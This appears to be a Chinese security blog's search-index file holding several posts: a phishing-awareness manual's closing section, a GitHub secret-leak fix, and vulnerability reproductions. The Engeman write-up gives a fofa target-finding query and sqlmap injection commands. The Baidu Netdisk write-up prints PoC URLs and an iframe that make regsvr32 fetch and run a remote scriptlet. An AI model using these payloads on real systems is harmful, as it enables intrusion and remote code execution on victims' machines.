建议将安全部值班电话存入您的手机通讯录，并将其设置为快速拨号之一，以备不时之需。</p><hr><h1 id="附录：手册修订记录"><a href="#附录：手册修订记录" class="headerlink" title="附录：手册修订记录"></a><strong>附录：手册修订记录</strong></h1><p> 我们将定期更新本手册以应对不断变化的威胁。请始终从内部门户获取最新版本。</p><table><thead><tr><th align="center">日期</th><th align="center">修订内容</th><th align="center">操作人</th></tr></thead><tbody><tr><td align="center">2024.10.10</td><td align="center">创建手册</td><td align="center">Winter</td></tr><tr><td align="center">2024.12.31</td><td align="center">更新内容和联系方式</td><td align="center">Winter</td></tr><tr><td align="center">2025.08.01</td><td align="center">添加深度伪造语音（AI诈骗）预警</td><td align="center">winter</td></tr><tr><td align="center">2025.08.03</td><td align="center">添加特征快速查询表</td><td align="center">Winter</td></tr><tr><td align="center">2025.08.30</td><td align="center">更新安全部办公地点</td><td align="center">Winter</td></tr></tbody></table><p><strong>您的警惕性（Vigilance），是我们安全防线中最关键、最有效的一环。安全之路，你我同行。</strong></p>]]></content>
    
    
    <categories>
      
      <category>钓鱼攻击</category>
      
    </categories>
    
    
    <tags>
      
      <tag>防范手册</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2025-8220</title>
    <link href="/2025/09/09/CVE-2025-8220/"/>
    <url>/2025/09/09/CVE-2025-8220/</url>
    
    <content type="html"><![CDATA[<p>一个比较简单的漏洞存在于 cookie 中的 SQL 注入漏洞，还是个通用型漏洞，该系统为国外的一款通用 web 系统</p><blockquote><p><a href="https://engeman.com/en/">https://engeman.com/en/</a></p><p>CVE-2025-8220</p></blockquote><p><img src="https://img1.plumstar.cn/upload520250909195118068.png" alt="CleanShot 2025-09-09 at 19.51.05@2x"></p><p>fofa 指纹查询语法（巴西那边用的比较多）：</p><blockquote><p>body&#x3D;”content&#x3D;&quot;Engeman®”</p></blockquote><p><img src="https://img1.plumstar.cn/upload520250909195215834.png" alt="CleanShot 2025-09-09 at 19.52.04@2x"></p><p>打开登录页面后，点击忘记密码并抓包</p><p><img src="https://img1.plumstar.cn/upload520250909195740658.png" alt="CleanShot 2025-09-09 at 19.57.11@2x"></p><p>修改 cookie 中的 LanguageCombobox 字段，添加一个单引号进行测试，可以看到返回的数据包存在报错信息，说明存在SQL注入</p><p><img src="https://img1.plumstar.cn/upload520250909195858985.png" alt="CleanShot 2025-09-09 at 19.58.20@2x"></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 使用sqlmap进行探测</span><br>sqlmap -u http:<span class="hljs-string">//ip/Login/RecoveryPass</span> <span class="hljs-params">--cookie</span> &#x27;LanguageCombobox=*&#x27; <span class="hljs-params">--level</span> 5 <span class="hljs-params">--risk</span> 3 <span class="hljs-params">--technique=SEB</span> <span class="hljs-params">--batch</span><br><span class="hljs-comment"># 获取数据库列表</span><br>sqlmap -u http:<span class="hljs-string">//ip/Login/RecoveryPass</span> <span class="hljs-params">--cookie</span> &#x27;LanguageCombobox=*&#x27; <span class="hljs-params">--dbs</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload520250909205427014.png" alt="CleanShot 2025-09-09 at 20.53.42@2x"></p><p><img src="https://img1.plumstar.cn/upload520250909205555138.png" alt="CleanShot 2025-09-09 at 20.55.35@2x"></p><p>后续写poc脚本跑什么的甩给AI就可以了，一个很好利用的漏洞</p>]]></content>
    
    
    <categories>
      
      <category>SQL注入</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>GitHub检测到敏感信息处理方案</title>
    <link href="/2025/09/05/GitHub%E6%A3%80%E6%B5%8B%E5%88%B0%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF/"/>
    <url>/2025/09/05/GitHub%E6%A3%80%E6%B5%8B%E5%88%B0%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF/</url>
    
    <content type="html"><![CDATA[<p>存个报错的解决方案，之前没遇到过</p><h1 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h1><p>用元宝的时候直接将元宝给我的图片链接插到了文章里，没有注意到元宝给你的图片链接是会带着你的腾讯云Secret ID，所以git报错了</p><p>报错内容如下，同时我在删除源文件后也就是<code>2025/09/05/百度网盘7.59 Windows客户端命令注入漏洞/index.html</code>这个文件后还是报错，那大概率就是git自己的缓存依旧存在，所以需要清除缓存重新生成</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">remote:</span> Resolving <span class="hljs-params">deltas:</span> <span class="hljs-number">100</span>% (<span class="hljs-number">61</span><span class="hljs-operator">/</span><span class="hljs-number">61</span>), completed <span class="hljs-keyword">with</span> <span class="hljs-number">24</span> local objects.<br><span class="hljs-params">remote:</span> <span class="hljs-params">error:</span> <span class="hljs-params">GH013:</span> Repository rule violations found for refs<span class="hljs-symbol">/heads/main.</span><br><span class="hljs-params">remote:</span> <br><span class="hljs-params">remote:</span> <span class="hljs-operator">-</span> GITHUB PUSH PROTECTION<br><span class="hljs-params">remote:</span>   —————————————————————————————————————————<br><span class="hljs-params">remote:</span>     Resolve the following violations before pushing again<br><span class="hljs-params">remote:</span> <br><span class="hljs-params">remote:</span>     <span class="hljs-operator">-</span> Push cannot contain secrets<br><span class="hljs-params">remote:</span> <br><span class="hljs-params">remote:</span>     <br><span class="hljs-params">remote:</span>      (<span class="hljs-operator">?</span>) Learn how to resolve a blocked push<br><span class="hljs-params">remote:</span>      https:<span class="hljs-operator">//</span>docs.github.com<span class="hljs-operator">/</span>code-security<span class="hljs-operator">/</span>secret-scanning<span class="hljs-operator">/</span>working-<span class="hljs-keyword">with</span>-secret-scanning-and-push-protection<span class="hljs-operator">/</span>working-<span class="hljs-keyword">with</span>-push-protection-from-the-command-line<span class="hljs-comment">#resolving-a-blocked-push</span><br><span class="hljs-params">remote:</span>     <br><span class="hljs-params">remote:</span>     <br><span class="hljs-params">remote:</span>       —— Tencent Cloud Secret ID ———————————————————————————<br><span class="hljs-params">remote:</span>        <span class="hljs-params">locations:</span><br><span class="hljs-params">remote:</span>          <span class="hljs-operator">-</span> <span class="hljs-params">commit:</span> <span class="hljs-number">105</span>a8fc43f4e05ebfdf83c1263a0ed44f226bc3e<br><span class="hljs-params">remote:</span>            <span class="hljs-params">path:</span> <span class="hljs-number">2025</span><span class="hljs-operator">/</span><span class="hljs-number">09</span><span class="hljs-operator">/</span><span class="hljs-number">05</span><span class="hljs-operator">/</span>百度网盘<span class="hljs-number">7.59</span> Windows客户端命令注入漏洞<span class="hljs-operator">/</span>index.html:<span class="hljs-number">32</span><br><span class="hljs-params">remote:</span>          <span class="hljs-operator">-</span> <span class="hljs-params">commit:</span> <span class="hljs-number">105</span>a8fc43f4e05ebfdf83c1263a0ed44f226bc3e<br><span class="hljs-params">remote:</span>            <span class="hljs-params">path:</span> <span class="hljs-number">2025</span><span class="hljs-operator">/</span><span class="hljs-number">09</span><span class="hljs-operator">/</span><span class="hljs-number">05</span><span class="hljs-operator">/</span>百度网盘<span class="hljs-number">7.59</span> Windows客户端命令注入漏洞<span class="hljs-operator">/</span>index.html:<span class="hljs-number">34</span><br><span class="hljs-params">remote:</span>          <span class="hljs-operator">-</span> <span class="hljs-params">commit:</span> <span class="hljs-number">105</span>a8fc43f4e05ebfdf83c1263a0ed44f226bc3e<br><span class="hljs-params">remote:</span>            <span class="hljs-params">path:</span> <span class="hljs-number">2025</span><span class="hljs-operator">/</span><span class="hljs-number">09</span><span class="hljs-operator">/</span><span class="hljs-number">05</span><span class="hljs-operator">/</span>百度网盘<span class="hljs-number">7.59</span> Windows客户端命令注入漏洞<span class="hljs-operator">/</span>index.html:<span class="hljs-number">303</span><br><span class="hljs-params">remote:</span>          <span class="hljs-operator">-</span> <span class="hljs-params">commit:</span> <span class="hljs-number">105</span>a8fc43f4e05ebfdf83c1263a0ed44f226bc3e<br><span class="hljs-params">remote:</span>            <span class="hljs-params">path:</span> <span class="hljs-number">2025</span><span class="hljs-operator">/</span><span class="hljs-number">09</span><span class="hljs-operator">/</span><span class="hljs-number">05</span><span class="hljs-operator">/</span>百度网盘<span class="hljs-number">7.59</span> Windows客户端命令注入漏洞<span class="hljs-operator">/</span>index.html:<span class="hljs-number">322</span><br><span class="hljs-params">remote:</span>          <span class="hljs-operator">-</span> <span class="hljs-params">commit:</span> <span class="hljs-number">105</span>a8fc43f4e05ebfdf83c1263a0ed44f226bc3e<br><span class="hljs-params">remote:</span>            <span class="hljs-params">path:</span> local-search.xml:<span class="hljs-number">11</span><br><span class="hljs-params">remote:</span>     <br><span class="hljs-params">remote:</span>        (<span class="hljs-operator">?</span>) To push, remove secret from commit(s) <span class="hljs-keyword">or</span> follow this URL to allow the secret.<br><span class="hljs-params">remote:</span>        https:<span class="hljs-symbol">//github.com/t0pbarry/t0pbarry.github.io/security/secret-scanning/unblock-secret/32HuSRm4czIzDbv1DCmPZqLBsKK</span><br><span class="hljs-params">remote:</span>     <br><span class="hljs-params">remote:</span> <br><span class="hljs-params">remote:</span> <br>To https:<span class="hljs-symbol">//github.com/t0pbarry/t0pbarry.github.io.git</span><br> <span class="hljs-operator">!</span> [remote rejected] HEAD <span class="hljs-operator">-&gt;</span> main (push declined due to repository rule violations)<br><span class="hljs-params">error:</span> failed to push some refs to &#x27;https:<span class="hljs-operator">//</span>github.com<span class="hljs-operator">/</span>t0pbarry<span class="hljs-operator">/</span>t0pbarry.github.io.git&#x27;<br>FATAL Something&#x27;s wrong. Maybe you can find the solution <span class="hljs-params">here:</span> https:<span class="hljs-symbol">//hexo.io/docs/troubleshooting.html</span><br><span class="hljs-params">Error:</span> Spawn failed<br>    at ChildProcess.<span class="hljs-symbol">&lt;anonymous&gt;</span> (<span class="hljs-operator">/</span>Users<span class="hljs-operator">/</span>winter<span class="hljs-operator">/</span>Desktop<span class="hljs-operator">/</span>MyArticle<span class="hljs-operator">/</span>hexo<span class="hljs-operator">/</span>hexo-blog<span class="hljs-operator">/</span>node_modules<span class="hljs-operator">/</span>hexo-deployer-git<span class="hljs-operator">/</span>node_modules<span class="hljs-operator">/</span>hexo-util<span class="hljs-operator">/</span>lib<span class="hljs-operator">/</span>spawn.js:<span class="hljs-number">51</span>:<span class="hljs-number">21</span>)<br>    at ChildProcess.emit (node:events:<span class="hljs-number">507</span>:<span class="hljs-number">28</span>)<br>    at ChildProcess._handle.onexit (node:internal<span class="hljs-operator">/</span>child_process:<span class="hljs-number">294</span>:<span class="hljs-number">12</span>)<br></code></pre></td></tr></table></figure><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>根据您提供的Hexo部署日志和GitHub推送错误，问题核心在于 <strong>生成的静态文件（<code>index.html</code>和<code>local-search.xml</code>）中包含硬编码的腾讯云Secret ID</strong>，触发GitHub推送保护机制。以下是完整解决方案：</p><hr><h3 id="🔍-问题根源"><a href="#🔍-问题根源" class="headerlink" title="🔍 问题根源"></a>🔍 问题根源</h3><ol><li><p><strong>敏感信息泄露点</strong><br>GitHub检测到以下文件中存在腾讯云Secret ID：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">- /<span class="hljs-number">2025</span>/<span class="hljs-number">09</span>/<span class="hljs-number">05</span>/百度网盘<span class="hljs-number">7.59</span> Windows客户端命令注入漏洞/<span class="hljs-keyword">index</span>.html<br>  → 第<span class="hljs-number">32</span>、<span class="hljs-number">34</span>、<span class="hljs-number">303</span>、<span class="hljs-number">322</span>行<br>- /<span class="hljs-keyword">local</span>-<span class="hljs-keyword">search</span>.xml → 第<span class="hljs-number">11</span>行<br></code></pre></td></tr></table></figure></li><li><p><strong>信息泄露路径</strong></p><table><thead><tr><th align="left">文件类型</th><th align="left">生成来源</th><th align="left">敏感信息位置</th></tr></thead><tbody><tr><td align="left"><code>index.html</code></td><td align="left">Hexo编译Markdown文章生成</td><td align="left">文章代码片段</td></tr><tr><td align="left"><code>local-search.xml</code></td><td align="left"><code>hexo-generator-search</code>插件生成</td><td align="left">文章内容索引</td></tr></tbody></table></li></ol><hr><h3 id="🛠️-修复方案"><a href="#🛠️-修复方案" class="headerlink" title="🛠️ 修复方案"></a>🛠️ 修复方案</h3><h4 id="✅-步骤1：定位并清除敏感信息"><a href="#✅-步骤1：定位并清除敏感信息" class="headerlink" title="✅ 步骤1：定位并清除敏感信息"></a>✅ 步骤1：定位并清除敏感信息</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 1. 定位包含Secret ID的源文件</span><br>grep -r <span class="hljs-string">&quot;AKID&quot;</span> <span class="hljs-string">./source/_posts/</span><br><br><span class="hljs-comment"># 2. 编辑漏洞文章Markdown文件</span><br><span class="hljs-comment"># 文件路径：source/_posts/百度网盘7.59 Windows客户端命令注入漏洞.md</span><br><span class="hljs-comment"># 删除以下行中的腾讯云Secret ID：</span><br><span class="hljs-comment">#   - 第32行附近：POC请求示例</span><br><span class="hljs-comment">#   - 第34行附近：XML代码块</span><br><span class="hljs-comment">#   - 第303/322行附近：复现步骤</span><br><br><span class="hljs-comment"># 3. 验证清理结果</span><br>grep <span class="hljs-string">&quot;AKID&quot;</span> <span class="hljs-string">./source/_posts/</span>*<span class="hljs-string">.md</span>  <span class="hljs-comment"># 应无输出</span><br></code></pre></td></tr></table></figure><h4 id="✅-步骤2：重置Hexo生成缓存"><a href="#✅-步骤2：重置Hexo生成缓存" class="headerlink" title="✅ 步骤2：重置Hexo生成缓存"></a>✅ 步骤2：重置Hexo生成缓存</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 清除旧编译文件</span><br>hexo clean<br><br><span class="hljs-comment"># 重新生成静态文件（确保无敏感信息）</span><br>hexo generate<br><br><span class="hljs-comment"># 检查生成文件</span><br>grep <span class="hljs-string">&quot;AKID&quot;</span> <span class="hljs-string">./public/</span>**/*<span class="hljs-string">.html</span> <span class="hljs-string">./public/</span>*<span class="hljs-string">.xml</span>  <span class="hljs-comment"># 应无输出</span><br></code></pre></td></tr></table></figure><h4 id="✅-步骤3：安全部署"><a href="#✅-步骤3：安全部署" class="headerlink" title="✅ 步骤3：安全部署"></a>✅ 步骤3：安全部署</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 强制更新部署仓库</span><br>rm -rf <span class="hljs-string">.deploy_git</span>  <span class="hljs-comment"># 删除旧部署缓存</span><br>hexo <span class="hljs-keyword">deploy</span> <span class="hljs-comment"># 执行到这里已经一切正常了</span><br></code></pre></td></tr></table></figure><hr><h3 id="⚠️-密钥管理强化"><a href="#⚠️-密钥管理强化" class="headerlink" title="⚠️ 密钥管理强化"></a>⚠️ 密钥管理强化</h3><ol><li><p><strong>立即重置泄露密钥</strong><br>登录腾讯云控制台 → 访问密钥 → 禁用&#x2F;删除泄露的Secret ID。</p></li><li><p><strong>预防硬编码</strong><br>在Markdown中使用​<strong>​环境变量占位符​</strong>​：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">```xml</span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- 错误方式 --&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">secret_id</span>&gt;</span>AKID[直接跟ID]<span class="hljs-tag">&lt;/<span class="hljs-name">secret_id</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- 正确方式 --&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">secret_id</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">env.TENCENT_SECRET_ID</span> &#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">secret_id</span>&gt;</span></span><br></code></pre></td></tr></table></figure><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less">通过<span class="hljs-selector-tag">Hexo</span>的<span class="hljs-selector-attr">[环境变量插件]</span>(<span class="hljs-attribute">https</span>:<span class="hljs-comment">//github.com/hexojs/hexo-inject-env)动态注入。</span><br></code></pre></td></tr></table></figure></li><li><p><strong>提交前扫描</strong><br>安装预提交检测：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装GitLeaks</span><br>brew install gitleaks<br><br><span class="hljs-comment"># 添加预提交钩子</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;gitleaks protect --staged -v&#x27;</span> &gt; .git/hooks/pre-commit<br><span class="hljs-built_in">chmod</span> +x .git/hooks/pre-commit<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>百度网盘7.59 Windows客户端命令注入漏洞</title>
    <link href="/2025/09/05/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%987.59%20Windows%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/09/05/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%987.59%20Windows%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p><strong>版本小于等于7.59.5.104</strong></p><p>只存在于Windows版本客户端</p><p>YunDetectService.exe监听本地10000端口，而且这个是程序是开机自启动的，只要你安装百度网盘就有，无需登录或者其他条件，可以通过命令查看端口情况</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-09-05%20at%2021.38.16@2x.png" alt="CleanShot 2025-09-05 at 21.38.16@2x"></p><p>10000端口web请求（版本7.50.0.130以前是HTTP，例如我的mac上的百度网盘，以后的版本就是HTTPS）以method传递参数，实现不同的功能</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//127.0.0.1:10000/?method=GetVersion</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-09-05%20at%2021.35.42@2x.png" alt="CleanShot 2025-09-05 at 21.35.42@2x"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-09-05%20at%2021.36.15@2x.png" alt="CleanShot 2025-09-05 at 21.36.15@2x"></p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>看了网上大部分的文章，感觉成因还是比较好理解的</p><h3 id="漏洞核心成因"><a href="#漏洞核心成因" class="headerlink" title="漏洞核心成因"></a><strong>漏洞核心成因</strong></h3><ol><li><strong>命令行注入漏洞</strong> 百度网盘服务 <code>YunDetectService.exe</code>（监听本地10000端口）在处理 <code>OpenSafeBox</code> 接口的 <code>uk</code> 参数时，未进行安全过滤。 <code>uk</code> 参数值直接拼接到 <code>BaiduNetdisk.exe</code> 的启动参数 <code>-userkey</code> 中，导致攻击者可通过注入额外命令操纵程序行为。</li></ol><p><img src="https://img1.plumstar.cn/upload5upload5ojdsiahdahdjka.png"></p><ul><li>URL 传递形式：</li></ul><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">method</span>=<span class="hljs-title function_">OpenSafeBox</span>&amp;<span class="hljs-title function_">uk</span>=<span class="hljs-title function_">xxxx</span><br></code></pre></td></tr></table></figure><ul><li>程序接收形式：</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">-opensafebox -userkey <span class="hljs-selector-attr">[具体userkey值]</span><br></code></pre></td></tr></table></figure><p>这里可以访问该该参数看看，可以看到参数确实传递过去了</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//127.0.0.1:10000/?method=OpenSafeBox&amp;uk=xxxx</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-09-05%20at%2023.53.11@2x.png" alt="CleanShot 2025-09-05 at 23.53.11@2x"></p><p>其中的method 主要包括：GetVersion，GetPcCode，DownloadShareItems，DownloadSelfOwnItems，OpenSafeBox，install，userkey等，其中，<strong>install regdll</strong> 功能存在进一步的安全风险。</p><ol start="2"><li><strong>危险功能调用（<code>install regdll</code>）</strong> 注入 <code>-install regdll</code> 命令可触发注册DLL功能，程序会调用系统工具 <code>regsvr32.exe</code> 注册 <code>YunShellExt.dll</code>。 <strong>文件路径通过命令行参数拼接而成，可控</strong>：DLL路径通过字符串拼接生成，攻击者通过路径穿越（<code>..\</code>）可指向任意位置（如用户目录）。</li></ol><p><img src="https://img1.plumstar.cn/upload5uploadjsjsjsjsjsj.png"></p><p>攻击者可以通过 <strong>路径穿越字符串</strong> <code>..\</code> 构造 DLL 的真实路径，例如：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>Users<span class="hljs-symbol">\\</span>[用户名]<span class="hljs-symbol">\\</span>AppData<span class="hljs-symbol">\\</span>Roaming<span class="hljs-symbol">\\</span>baidu<span class="hljs-symbol">\\</span>BaiduNetdisk<br></code></pre></td></tr></table></figure><blockquote><blockquote><p>唯一限制：需要提前知道当前系统用户名。</p></blockquote></blockquote><ol start="3"><li><strong><code>regsvr32.exe</code> 二次注入</strong> 注册DLL时，程序直接拼接 <code>regsvr32.exe</code> 的命令行参数且未过滤，允许攻击者 通过双引号截断伪造参数边界（如 <code>&quot;C:\Windows\System32\scrobj.dll&quot;</code>）。 注入恶意参数 <code>/i:[远程XML] /u</code>，强制 <code>regsvr32.exe</code> 下载并执行远程恶意脚本（如 <code>http://attacker/poc.xml</code>），XML 中的恶意指令会被执行，从而实现 <strong>远程命令注入</strong></li></ol><hr><h3 id="漏洞利用链"><a href="#漏洞利用链" class="headerlink" title="漏洞利用链"></a><strong>漏洞利用链</strong></h3><p><img src="https://img1.plumstar.cn/upload51ce4f688ad004.png"></p><hr><h3 id="PoC关键步骤"><a href="#PoC关键步骤" class="headerlink" title="PoC关键步骤"></a><strong>PoC关键步骤</strong></h3><p>攻击者通过构造特殊请求实现命令执行：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">https:<span class="hljs-operator">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">10000</span><span class="hljs-operator">/</span><span class="hljs-operator">?</span>method<span class="hljs-operator">=</span>OpenSafeBox&amp;uk<span class="hljs-operator">=</span>a <span class="hljs-operator">-</span>install regdll <span class="hljs-string">&quot;C:<span class="hljs-char escape_">\\</span>Windows<span class="hljs-char escape_">\\</span>System32<span class="hljs-char escape_">\\</span>scrobj.dll<span class="hljs-char escape_">\&quot;</span> /u /i:http://attacker/poc.xml <span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>Users<span class="hljs-char escape_">\\</span>[用户名]<span class="hljs-char escape_">\\</span>AppData<span class="hljs-char escape_">\\</span>Roaming<span class="hljs-char escape_">\\</span>baidu<span class="hljs-char escape_">\\</span>BaiduNetdisk</span><br></code></pre></td></tr></table></figure><ol><li>通过 <code>uk</code> 注入 <code>-install regdll</code> 命令。</li><li>利用路径穿越指向用户目录下的可控位置。</li><li>通过双引号截断将DLL路径替换为 <code>scrobj.dll</code> 并注入参数 <code>/i</code>。</li><li><code>regsvr32.exe</code> 加载远程XML脚本执行恶意命令。</li></ol><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p><strong>注：看网上说python起的这个http.server是单线程容易出问题，容易卡住，不过我复现很顺利，如果卡住了就换别的开服务的试试</strong></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">python -m http.<span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-09-05%20at%2023.36.34@2x.png" alt="CleanShot 2025-09-05 at 23.36.34@2x"></p><ul><li>poc.html</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-symbol">&lt;html&gt;</span> <span class="hljs-operator">&lt;</span>iframewidth<span class="hljs-operator">=</span><span class="hljs-string">&quot;1px&quot;</span>height<span class="hljs-operator">=</span><span class="hljs-string">&quot;1px&quot;</span>referrerpolicy<span class="hljs-operator">=</span><span class="hljs-string">&quot;no-referrer&quot;</span>src<span class="hljs-operator">=</span>&#x27;https:<span class="hljs-operator">//</span>localhost:<span class="hljs-number">10000</span><span class="hljs-operator">/</span><span class="hljs-operator">?</span>method<span class="hljs-operator">=</span>OpenSafeBox&amp;uk<span class="hljs-operator">=</span>a <span class="hljs-operator">-</span>install regdll <span class="hljs-string">&quot;C:<span class="hljs-char escape_">\\</span><span class="hljs-char escape_">\W</span>indows<span class="hljs-char escape_">\\</span>System32<span class="hljs-char escape_">\\</span>scrobj.dll<span class="hljs-char escape_">\&quot;</span> /u /i:http://127.0.0.1:8000/poc.xml <span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>..<span class="hljs-char escape_">\\</span>Users<span class="hljs-char escape_">\T</span>est<span class="hljs-char escape_">\A</span>ppData<span class="hljs-char escape_">\R</span>oaming<span class="hljs-char escape_">\b</span>aidu<span class="hljs-char escape_">\B</span>aiduNetdisk&#x27;&gt;&lt;/iframe&gt;&lt;/html&gt;</span><br></code></pre></td></tr></table></figure><ul><li>poc.xml</li></ul><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">scriptlet</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">registration</span> <span class="hljs-attr">progid</span>=<span class="hljs-string">&quot;poc&quot;</span> <span class="hljs-attr">classid</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span 